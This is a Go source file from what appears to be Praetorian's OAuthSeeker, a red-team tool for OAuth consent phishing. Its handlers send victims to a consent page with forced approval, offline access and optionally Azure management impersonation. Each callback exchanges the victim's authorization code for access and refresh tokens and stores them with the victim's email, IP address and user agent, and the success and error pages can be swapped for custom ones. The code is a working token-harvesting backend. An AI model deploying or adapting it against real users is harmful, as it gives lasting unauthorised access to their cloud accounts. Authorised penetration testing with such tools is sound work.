// Copyright 2025 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package oauth

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/praetorian-inc/OAuthSeeker/pkg/config"
	"github.com/praetorian-inc/OAuthSeeker/pkg/database"
	"github.com/praetorian-inc/OAuthSeeker/pkg/utils"
	"golang.org/x/oauth2"

	"github.com/praetorian-inc/OAuthSeeker/static"
)

var oauthConfig *oauth2.Config
var db *database.Database
var cfg *config.Config

func Initialize(configuration *config.Config, database *database.Database) {
	cfg = configuration
	db = database

	hasOfflineAccess := false
	for _, scope := range cfg.RegisteredScopes {
		if scope == "offline_access" {
			hasOfflineAccess = true
			break
		}
	}

	scopes := cfg.RegisteredScopes
	if !hasOfflineAccess {
		scopes = append(scopes, "offline_access")
	}

	if configuration.IncludeAzureManagement {
		scopes = append(scopes, "https://management.azure.com/user_impersonation")
	}

	oauthConfig = &oauth2.Config{
		ClientID:     configuration.ClientID,
		ClientSecret: configuration.ClientSecret,
		RedirectURL:  configuration.CallbackURL,
		Scopes:       scopes,
		Endpoint:     configuration.Endpoints,
	}
}

func RedirectHandler(w http.ResponseWriter, r *http.Request) {
	url := oauthConfig.AuthCodeURL("state", oauth2.AccessTypeOffline, oauth2.ApprovalForce)
	http.Redirect(w, r, url, http.StatusFound)
}

func CallbackHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("Received callback request from: %s\n", r.RemoteAddr)

	ctx := context.Background()
	code := r.URL.Query().Get("code")
	if code == "" {
		fmt.Println("Authorization code not found in URL unable to authenticate user")
		handleRedirect(w, r, "error")
		return
	}
	fmt.Printf("Received authorization code: %s...[truncated]\n", code[:10])

	exchangeConfig := *oauthConfig
	exchangeConfig.Scopes = []string{}

	fmt.Printf("Attempting token exchange with client ID: %s\n", exchangeConfig.ClientID)
	fmt.Printf("Exchange scopes (Graph): %v\n", exchangeConfig.Scopes)
	token, err := exchangeConfig.Exchange(ctx, code)
	if err != nil {
		fmt.Printf("Graph token exchange failed: %v\n", err)
		handleRedirect(w, r, "error")
		return
	}
	fmt.Printf("Successfully exchanged code for token. Token expires at: %v\n", token.Expiry)

	userIP := utils.GetUserIP(r)
	userAgent := r.UserAgent()
	fmt.Printf("User details - IP: %s, User-Agent: %s\n", userIP, userAgent)

	email, err := getEmail(token.AccessToken)
	if err != nil {
		fmt.Printf("Failed to extract email from access token: %v\n", err)
		handleRedirect(w, r, "error")
		return
	}
	fmt.Printf("Successfully extracted email: %s\n", email)

	oauthToken := database.OAuthToken{
		Email:         email,
		AccessToken:   token.AccessToken,
		RefreshToken:  token.RefreshToken,
		Expiry:        token.Expiry,
		TokenType:     token.TokenType,
		UserIP:        userIP,
		UserAgent:     userAgent,
		CaptureDate:   time.Now(),
		LastRefreshed: time.Now(),
	}

	err = db.LogToken(oauthToken)
	if err != nil {
		fmt.Printf("Failed to insert token into database: %v\n", err)
		handleRedirect(w, r, "error")
		return
	}

	err = db.UpdateCurrentToken(oauthToken)
	if err != nil {
		fmt.Printf("Failed to insert token into database: %v\n", err)
		handleRedirect(w, r, "error")
		return
	}

	fmt.Printf("Successfully processed OAuth callback for user: %s\n", email)
	handleRedirect(w, r, "success")
}

func ResultHandler(w http.ResponseWriter, r *http.Request) {
	status := r.URL.Query().Get("status")

	var fileContent []byte
	var err error

	if status == "success" {
		if cfg.SkinSuccessPath != "" {
			fileContent, err = os.ReadFile(cfg.SkinSuccessPath)
			if err != nil {
				fileContent = static.DefaultErrorHTML
			}
		} else {
			fileContent = static.DefaultSuccessHTML
		}
	} else {
		if cfg.SkinErrorPath != "" {
			fileContent, err = os.ReadFile(cfg.SkinErrorPath)
			if err != nil {
				fileContent = static.DefaultErrorHTML
			}
		} else {
			fileContent = static.DefaultErrorHTML
		}
	}

	w.Header().Set("Content-Type", "text/html")
	_, err = w.Write(fileContent)
	if err != nil {
		log.Printf("Error writing response: %v\n", err)
	}
}

func getEmail(accessToken string) (string, error) {
	parts := strings.Split(accessToken, ".")
	if len(parts) != 3 {
		return "", errors.New("invalid token format")
	}

	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return "", err
	}

	var claims map[string]interface{}
	if err := json.Unmarshal(payload, &claims); err != nil {
		return "", err
	}

	if email, ok := claims["upn"].(string); ok {
		return email, nil
	} else {
		return "", errors.New("UPN claim not found or not a string")
	}
}

func handleRedirect(w http.ResponseWriter, r *http.Request, status string) {
	if cfg.ForwardURL != "" {
		http.Redirect(w, r, cfg.ForwardURL, http.StatusSeeOther)
		return
	}

	http.Redirect(w, r, fmt.Sprintf("/login?status=%s", status), http.StatusFound)
}
